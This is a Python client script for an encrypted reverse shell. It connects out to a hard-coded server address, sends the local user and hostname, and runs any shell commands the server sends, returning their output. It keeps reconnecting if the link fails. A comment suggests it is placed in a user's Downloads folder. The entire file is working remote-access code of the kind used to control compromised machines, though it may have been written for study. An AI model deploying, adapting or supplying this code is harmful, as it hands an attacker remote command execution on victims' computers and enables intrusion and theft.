import socket
import subprocess
import json
import time
import ssl

SERVER_HOST = '192.168.0.132'   # Server's IP address
SERVER_PORT = 12345             # Server's port

# Path to the server's public certificate for verification - we need this to be in the same directory as the client.py file (usually the user's $HOME/Downloads/ folder)
CA_CERTFILE = 'server.crt'

def send_message(sock, message):
    """Sends a JSON message to the specified socket."""
    serialized_message = json.dumps(message).encode('utf-8')
    message_length = str(len(serialized_message)).zfill(64).encode('utf-8')
    sock.sendall(message_length + serialized_message)

def start_client():
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Create an SSL context for the client
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            # Load the server's self-signed certificate to trust it
            context.load_verify_locations(CA_CERTFILE)
            # Require certificate verification - this is the default, but we'll be explicit
            context.verify_mode = ssl.CERT_REQUIRED
            # Disable hostname verification for self-signed certs with IP addresses
            # In production with FQDNs and proper CAs, this should be True - but we're using self-signed certs
            context.check_hostname = False 

            # Wrap the socket before connecting
            # server_hostname is important for SNI (Server Name Indication)
            # For IP addresses, you might omit it or use the IP
            secure_client_socket = context.wrap_socket(client_socket, server_hostname=SERVER_HOST)

            secure_client_socket.connect((SERVER_HOST, SERVER_PORT))
            print(f"[*] Connected securely to server {SERVER_HOST}:{SERVER_PORT}")

            # Send client hostname and username to the server to be displayed in the server terminal ("echo $(whoami)@$(hostname)") - bad implementation of a shell
            try:
                hostname_info = subprocess.run(
                    "echo $(whoami)@$(hostname)", shell=True, capture_output=True, text=True
                ).stdout.strip()
                send_message(secure_client_socket, {'type': 'info', 'hostname': hostname_info})
            except Exception as e:
                print(f"[-] Error sending hostname info: {e}")

            while True:
                try:
                    # Use the secure_client_socket for all communication
                    message_length = int(secure_client_socket.recv(64).decode('utf-8').strip()) # recv(64) is the message length
                    command_message = secure_client_socket.recv(message_length).decode('utf-8')
                    data = json.loads(command_message)

                    if data['type'] == 'command':
                        # Execute the command and send the output back to the server
                        command = data['command']
                        print(f"[*] Executing command: {command}")
                        process = subprocess.run(command, shell=True, capture_output=True, text=True) # this is where the command is executed, and where the dangerous stuff happens
                        output = process.stdout + process.stderr
                        send_message(secure_client_socket, {'type': 'output', 'output': output})

                except json.JSONDecodeError:
                    print("[-] Invalid JSON received.")
                    break
                except ssl.SSLError as e:
                    print(f"[-] SSL Error during communication: {e}")
                    break # Break inner loop to attempt reconnection
                except Exception as e:
                    print(f"[-] Error during communication: {e}")
                    break # Break inner loop to attempt reconnection

        except ConnectionRefusedError:
            print(f"[-] Connection refused. Retrying in 5 seconds...")
            time.sleep(5)
        except ssl.SSLError as e:
            print(f"[-] SSL Handshake failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"[-] An unexpected error occurred: {e}. Retrying in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    start_client()
